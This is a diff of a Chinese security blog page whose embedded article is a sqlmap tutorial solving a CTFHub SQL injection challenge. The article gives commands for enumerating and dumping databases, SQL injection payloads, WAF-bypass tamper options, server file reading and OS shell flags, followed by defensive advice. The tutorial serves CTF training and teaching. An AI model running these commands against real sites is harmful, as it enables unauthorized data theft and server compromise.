@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html lang="en" dir="auto" data-theme="auto">
 
-<head><script src="/san-blog/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=san-blog/livereload" data-no-instant defer></script><meta charset="utf-8">
+<head><meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<meta name="robots" content="noindex, nofollow">
+<meta name="robots" content="index, follow">
 <title>sqlmap 使用指南：从入门到 CTF 夺旗 | 东阳的安全笔记</title>
 <meta name="keywords" content="CTF, Web安全, SQL注入, sqlmap, 工具使用">
 <meta name="description" content="什么是 sqlmap
@@ -108,16 +108,16 @@ pip install sqlmap
 实战：CTF 中的标准操作流程
 以下以一次真实的 CTF 题目为例，展示完整的 sqlmap 利用链。">
 <meta name="author" content="东阳">
-<link rel="canonical" href="http://localhost:1313/san-blog/posts/sqlmap-usage-guide/">
+<link rel="canonical" href="https://Samantha09.github.io/san-blog/posts/sqlmap-usage-guide/">
 <link crossorigin="anonymous" href="/san-blog/assets/css/stylesheet.cd9298b33628769aa1bc1acebbbfd7aa11ce81dfe03484d479e1907760249a1d.css" integrity="sha256-zZKYszYodpqhvBrOu7/XqhHOgd/gNITUeeGQd2Akmh0=" rel="preload stylesheet" as="style">
-<link rel="icon" href="http://localhost:1313/san-blog/favicon.ico">
-<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/san-blog/favicon-16x16.png">
-<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/san-blog/favicon-32x32.png">
-<link rel="apple-touch-icon" href="http://localhost:1313/san-blog/apple-touch-icon.png">
-<link rel="mask-icon" href="http://localhost:1313/san-blog/safari-pinned-tab.svg">
+<link rel="icon" href="https://Samantha09.github.io/san-blog/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://Samantha09.github.io/san-blog/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://Samantha09.github.io/san-blog/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://Samantha09.github.io/san-blog/apple-touch-icon.png">
+<link rel="mask-icon" href="https://Samantha09.github.io/san-blog/safari-pinned-tab.svg">
 <meta name="theme-color" content="#2e2e33">
 <meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" hreflang="en" href="http://localhost:1313/san-blog/posts/sqlmap-usage-guide/">
+<link rel="alternate" hreflang="en" href="https://Samantha09.github.io/san-blog/posts/sqlmap-usage-guide/">
 <noscript>
     <style>
         #theme-toggle,
@@ -163,13 +163,87 @@ pip install sqlmap
         document.querySelector("html").dataset.theme = 'light';
     }
 
+</script><meta property="og:url" content="https://Samantha09.github.io/san-blog/posts/sqlmap-usage-guide/">
+  <meta property="og:site_name" content="东阳的安全笔记">
+  <meta property="og:title" content="sqlmap 使用指南：从入门到 CTF 夺旗">
+  <meta property="og:description" content="什么是 sqlmap sqlmap 是一款开源的自动化 SQL 注入工具，支持检测和利用多种类型的 SQL 注入漏洞，能够自动识别后端数据库类型、枚举数据库结构、提取数据，甚至获取操作系统 shell。在 CTF 比赛和渗透测试中，它是处理 SQL 注入效率最高的工具之一。
+安装 方式一：直接克隆源码（推荐） git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git cd sqlmap python sqlmap.py --version 方式二：包管理器安装 # Debian/Ubuntu sudo apt install sqlmap # macOS brew install sqlmap # Python pip pip install sqlmap 核心参数速查 参数 说明 -u URL 指定目标 URL --data &#34;data&#34; POST 数据包 -p &#34;param&#34; 指定测试参数 --tables 枚举所有表名 --columns -T table 枚举指定表的列名 --dump -T table 导出指定表的数据 --dump -C col -T table 导出指定列的数据 -D dbname 指定数据库名 --dbs 枚举所有数据库 --batch 自动选择默认选项，无需交互 --threads 10 设置线程数，加快检测速度 --level 1-5 检测等级，默认 1，越高测试越全面 --risk 1-3 风险等级，默认 1，越高越激进 --technique 指定注入技术（如 B,E,U,T,Q） --os-shell 获取操作系统 shell（需要权限） --file-read /path 读取服务器文件 --tamper 使用 tamper 脚本绕过 WAF 实战：CTF 中的标准操作流程 以下以一次真实的 CTF 题目为例，展示完整的 sqlmap 利用链。">
+  <meta property="og:locale" content="zh_cn">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-06-02T22:47:00+08:00">
+    <meta property="article:modified_time" content="2026-06-02T22:47:00+08:00">
+    <meta property="article:tag" content="CTF">
+    <meta property="article:tag" content="Web安全">
+    <meta property="article:tag" content="SQL注入">
+    <meta property="article:tag" content="Sqlmap">
+    <meta property="article:tag" content="工具使用">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="sqlmap 使用指南：从入门到 CTF 夺旗">
+  <meta name="twitter:description" content="什么是 sqlmap sqlmap 是一款开源的自动化 SQL 注入工具，支持检测和利用多种类型的 SQL 注入漏洞，能够自动识别后端数据库类型、枚举数据库结构、提取数据，甚至获取操作系统 shell。在 CTF 比赛和渗透测试中，它是处理 SQL 注入效率最高的工具之一。
+安装 方式一：直接克隆源码（推荐） git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git cd sqlmap python sqlmap.py --version 方式二：包管理器安装 # Debian/Ubuntu sudo apt install sqlmap # macOS brew install sqlmap # Python pip pip install sqlmap 核心参数速查 参数 说明 -u URL 指定目标 URL --data &#34;data&#34; POST 数据包 -p &#34;param&#34; 指定测试参数 --tables 枚举所有表名 --columns -T table 枚举指定表的列名 --dump -T table 导出指定表的数据 --dump -C col -T table 导出指定列的数据 -D dbname 指定数据库名 --dbs 枚举所有数据库 --batch 自动选择默认选项，无需交互 --threads 10 设置线程数，加快检测速度 --level 1-5 检测等级，默认 1，越高测试越全面 --risk 1-3 风险等级，默认 1，越高越激进 --technique 指定注入技术（如 B,E,U,T,Q） --os-shell 获取操作系统 shell（需要权限） --file-read /path 读取服务器文件 --tamper 使用 tamper 脚本绕过 WAF 实战：CTF 中的标准操作流程 以下以一次真实的 CTF 题目为例，展示完整的 sqlmap 利用链。">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://Samantha09.github.io/san-blog/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "sqlmap 使用指南：从入门到 CTF 夺旗",
+      "item": "https://Samantha09.github.io/san-blog/posts/sqlmap-usage-guide/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "sqlmap 使用指南：从入门到 CTF 夺旗",
+  "name": "sqlmap 使用指南：从入门到 CTF 夺旗",
+  "description": "什么是 sqlmap sqlmap 是一款开源的自动化 SQL 注入工具，支持检测和利用多种类型的 SQL 注入漏洞，能够自动识别后端数据库类型、枚举数据库结构、提取数据，甚至获取操作系统 shell。在 CTF 比赛和渗透测试中，它是处理 SQL 注入效率最高的工具之一。\n安装 方式一：直接克隆源码（推荐） git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git cd sqlmap python sqlmap.py --version 方式二：包管理器安装 # Debian/Ubuntu sudo apt install sqlmap # macOS brew install sqlmap # Python pip pip install sqlmap 核心参数速查 参数 说明 -u URL 指定目标 URL --data \u0026quot;data\u0026quot; POST 数据包 -p \u0026quot;param\u0026quot; 指定测试参数 --tables 枚举所有表名 --columns -T table 枚举指定表的列名 --dump -T table 导出指定表的数据 --dump -C col -T table 导出指定列的数据 -D dbname 指定数据库名 --dbs 枚举所有数据库 --batch 自动选择默认选项，无需交互 --threads 10 设置线程数，加快检测速度 --level 1-5 检测等级，默认 1，越高测试越全面 --risk 1-3 风险等级，默认 1，越高越激进 --technique 指定注入技术（如 B,E,U,T,Q） --os-shell 获取操作系统 shell（需要权限） --file-read /path 读取服务器文件 --tamper 使用 tamper 脚本绕过 WAF 实战：CTF 中的标准操作流程 以下以一次真实的 CTF 题目为例，展示完整的 sqlmap 利用链。\n",
+  "keywords": [
+    "CTF", "Web安全", "SQL注入", "sqlmap", "工具使用"
+  ],
+  "articleBody": "什么是 sqlmap sqlmap 是一款开源的自动化 SQL 注入工具，支持检测和利用多种类型的 SQL 注入漏洞，能够自动识别后端数据库类型、枚举数据库结构、提取数据，甚至获取操作系统 shell。在 CTF 比赛和渗透测试中，它是处理 SQL 注入效率最高的工具之一。\n安装 方式一：直接克隆源码（推荐） git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git cd sqlmap python sqlmap.py --version 方式二：包管理器安装 # Debian/Ubuntu sudo apt install sqlmap # macOS brew install sqlmap # Python pip pip install sqlmap 核心参数速查 参数 说明 -u URL 指定目标 URL --data \"data\" POST 数据包 -p \"param\" 指定测试参数 --tables 枚举所有表名 --columns -T table 枚举指定表的列名 --dump -T table 导出指定表的数据 --dump -C col -T table 导出指定列的数据 -D dbname 指定数据库名 --dbs 枚举所有数据库 --batch 自动选择默认选项，无需交互 --threads 10 设置线程数，加快检测速度 --level 1-5 检测等级，默认 1，越高测试越全面 --risk 1-3 风险等级，默认 1，越高越激进 --technique 指定注入技术（如 B,E,U,T,Q） --os-shell 获取操作系统 shell（需要权限） --file-read /path 读取服务器文件 --tamper 使用 tamper 脚本绕过 WAF 实战：CTF 中的标准操作流程 以下以一次真实的 CTF 题目为例，展示完整的 sqlmap 利用链。\n题目环境 http://challenge-fd9b924ef336b5fa.sandbox.ctfhub.com:10800/?id=1 Step 1：检测注入点 直接使用 -u 参数让 sqlmap 自动检测：\npython sqlmap.py -u \"http://challenge-fd9b924ef336b5fa.sandbox.ctfhub.com:10800/?id=1\" sqlmap 会自动测试各种注入技术（布尔盲注、报错注入、时间盲注、UNION 注入等）。如果过程中弹出交互式提问，可以加上 --batch 自动选择默认答案。\n检测结果示例：\nParameter: id (GET) Type: time-based blind Title: MySQL \u003e= 5.0.12 AND time-based blind (query SLEEP) Payload: id=1 AND (SELECT 6044 FROM (SELECT(SLEEP(5)))rMiZ) Type: UNION query Title: Generic UNION query (NULL) - 2 columns Payload: id=-5486 UNION ALL SELECT CONCAT(...),NULL-- - 检测到两种注入方式：时间盲注 和 UNION 注入。\nStep 2：枚举数据库 python sqlmap.py -u \"http://target/?id=1\" --dbs 输出：\n[*] information_schema [*] performance_schema [*] mysql [*] sqli CTF 中 flag 通常放在自定义的数据库里，这里锁定 sqli。\nStep 3：枚举表名 python sqlmap.py -u \"http://target/?id=1\" --tables 默认会枚举所有数据库的表。如果已知数据库名，可以加 -D 限定范围：\npython sqlmap.py -u \"http://target/?id=1\" -D sqli --tables 输出：\nDatabase: sqli [2 tables] +-------+ | flag | | news | +-------+ Step 4：枚举列名 python sqlmap.py -u \"http://target/?id=1\" -T flag --columns 输出：\nDatabase: sqli Table: flag [1 column] +--------+--------------+ | Column | Type | +--------+--------------+ | flag | varchar(100) | +--------+--------------+ Step 5：导出数据 导出整张表：\npython sqlmap.py -u \"http://target/?id=1\" -T flag --dump 仅导出指定列（节省时间和请求数）：\npython sqlmap.py -u \"http://target/?id=1\" -T flag -C flag --dump 输出：\nDatabase: sqli Table: flag [1 entry] +----------------------------------+ | flag | +----------------------------------+ | ctfhub{a9f73a04458ea72566850f8a} | +----------------------------------+ Flag 到手。\n进阶技巧 1. 自动模式（无人值守） CTF 中为了快速出结果，通常加 --batch 跳过所有交互确认：\npython sqlmap.py -u \"http://target/?id=1\" --tables --batch 2. 限定注入技术 如果已知是 UNION 注入，可以用 --technique=U 跳过其他检测，大幅提速：\npython sqlmap.py -u \"http://target/?id=1\" --technique=U --tables 技术代号对照：\nB：布尔盲注 E：报错注入 U：UNION 注入 S：堆叠查询 T：时间盲注 Q：内联查询 3. 提高检测深度 默认 --level=1 --risk=1 可能检测不到某些注入点。遇到疑似注入但 sqlmap 没报的情况，可以提升等级：\npython sqlmap.py -u \"http://target/?id=1\" --level=3 --risk=2 注意：level 和 risk 越高，发送的请求越多，对目标的压力越大。CTF 中通常没问题，生产环境谨慎使用。\n4. 使用 Tamper 绕过 WAF 目标有 WAF 拦截时，可以尝试编码绕过：\npython sqlmap.py -u \"http://target/?id=1\" --tamper=space2comment,charencode 常用 tamper：\nspace2comment：空格替换为注释 charencode：URL 编码 base64encode：Base64 编码 randomcase：随机大小写 查看所有 tamper：\npython sqlmap.py --list-tampers 5. Cookie 注入与请求头注入 有些注入点不在 URL 参数，而在 Cookie 或请求头中：\n# Cookie 注入 python sqlmap.py -u \"http://target/\" --cookie=\"id=1*\" --tables # User-Agent 注入 python sqlmap.py -u \"http://target/\" --user-agent=\"Mozilla/1*\" # 注入点用 * 号标记 6. 读取服务器文件 如果数据库用户有 FILE 权限，可以读取服务器上的文件：\npython sqlmap.py -u \"http://target/?id=1\" --file-read=\"/flag\" 7. POST 注入 POST 请求的注入点：\npython sqlmap.py -u \"http://target/login\" --data=\"username=admin\u0026password=1\" 8. 指定参数测试 当请求中有多个参数，只想测试其中一个：\npython sqlmap.py -u \"http://target/?id=1\u0026name=test\" -p id --tables 完整 Payload 模板 # 全自动探测 sqlmap -u \"URL\" --batch # 数据库 → 表 → 列 → 数据 sqlmap -u \"URL\" --dbs --batch sqlmap -u \"URL\" -D database --tables --batch sqlmap -u \"URL\" -D database -T table --columns --batch sqlmap -u \"URL\" -D database -T table -C column --dump --batch # 一键出 flag（已知表名列名时） sqlmap -u \"URL\" -D sqli -T flag -C flag --dump --batch 防御建议 参数化查询（Prepared Statements）：彻底杜绝 SQL 注入，所有后端语言都原生支持 ORM 框架：使用 Django ORM、SQLAlchemy、MyBatis 等，避免手动拼接 SQL 最小权限原则：应用数据库账号只赋予 SELECT/INSERT/UPDATE 必要权限，禁止 FILE、LOAD DATA 等危险权限 关闭错误回显：生产环境不暴露数据库报错信息 WAF 防护：部署 ModSecurity、雷池等 WAF 作为第二层防护，但不能替代代码层修复 参考链接 sqlmap 官方文档 sqlmap GitHub OWASP SQL Injection Prevention Cheat Sheet ",
+  "wordCount" : "528",
+  "inLanguage": "en",
+  "datePublished": "2026-06-02T22:47:00+08:00",
+  "dateModified": "2026-06-02T22:47:00+08:00",
+  "author":{
+    "@type": "Person",
+    "name": "东阳"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://Samantha09.github.io/san-blog/posts/sqlmap-usage-guide/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "东阳的安全笔记",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://Samantha09.github.io/san-blog/favicon.ico"
+    }
+  }
+}
 </script>
 </head>
 <body id="top">
     <header class="header">
     <nav class="header-nav">
         <div class="logo">
-            <a href="http://localhost:1313/san-blog/" accesskey="h" title="东阳的安全笔记 (Alt + H)">东阳的安全笔记</a>
+            <a href="https://Samantha09.github.io/san-blog/" accesskey="h" title="东阳的安全笔记 (Alt + H)">东阳的安全笔记</a>
             <div class="logo-switches">
                 <button id="theme-toggle" class="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                     <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
@@ -195,27 +269,27 @@ pip install sqlmap
         </div>
         <ul id="menu" class="menu">
             <li>
-                <a href="http://localhost:1313/san-blog/" title="首页">
+                <a href="https://Samantha09.github.io/san-blog/" title="首页">
                     <span>首页</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/san-blog/posts/" title="文章">
+                <a href="https://Samantha09.github.io/san-blog/posts/" title="文章">
                     <span>文章</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/san-blog/tags/" title="标签">
+                <a href="https://Samantha09.github.io/san-blog/tags/" title="标签">
                     <span>标签</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/san-blog/categories/" title="分类">
+                <a href="https://Samantha09.github.io/san-blog/categories/" title="分类">
                     <span>分类</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/san-blog/archives/" title="归档">
+                <a href="https://Samantha09.github.io/san-blog/archives/" title="归档">
                     <span>归档</span>
                 </a>
             </li>
@@ -496,18 +570,18 @@ Table: flag
 
   <footer class="post-footer">
     <ul class="post-tags">
-      <li><a href="http://localhost:1313/san-blog/tags/ctf/">CTF</a></li>
-      <li><a href="http://localhost:1313/san-blog/tags/web%E5%AE%89%E5%85%A8/">Web安全</a></li>
-      <li><a href="http://localhost:1313/san-blog/tags/sql%E6%B3%A8%E5%85%A5/">SQL注入</a></li>
-      <li><a href="http://localhost:1313/san-blog/tags/sqlmap/">Sqlmap</a></li>
-      <li><a href="http://localhost:1313/san-blog/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">工具使用</a></li>
+      <li><a href="https://Samantha09.github.io/san-blog/tags/ctf/">CTF</a></li>
+      <li><a href="https://Samantha09.github.io/san-blog/tags/web%E5%AE%89%E5%85%A8/">Web安全</a></li>
+      <li><a href="https://Samantha09.github.io/san-blog/tags/sql%E6%B3%A8%E5%85%A5/">SQL注入</a></li>
+      <li><a href="https://Samantha09.github.io/san-blog/tags/sqlmap/">Sqlmap</a></li>
+      <li><a href="https://Samantha09.github.io/san-blog/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">工具使用</a></li>
     </ul>
 <nav class="paginav">
-  <a class="prev" href="http://localhost:1313/san-blog/posts/ctfhub-time-based-sql-injection/">
+  <a class="prev" href="https://Samantha09.github.io/san-blog/posts/ctfhub-time-based-sql-injection/">
     <span class="title">« Prev</span>
     <span>深入理解 Time-based Blind SQL 注入：原理、利用与 sqlmap 实操</span>
   </a>
-  <a class="next" href="http://localhost:1313/san-blog/posts/dvcs-ripper-hg-leak-exploit/">
+  <a class="next" href="https://Samantha09.github.io/san-blog/posts/dvcs-ripper-hg-leak-exploit/">
     <span class="title">Next »</span>
     <span>dvcs-ripper 与 Mercurial (.hg) 信息泄露漏洞详解</span>
   </a>
@@ -518,7 +592,7 @@ Table: flag
     </main>
     
 <footer class="footer">
-        <span>&copy; 2026 <a href="http://localhost:1313/san-blog/">东阳的安全笔记</a></span> · 
+        <span>&copy; 2026 <a href="https://Samantha09.github.io/san-blog/">东阳的安全笔记</a></span> · 
 
     
     
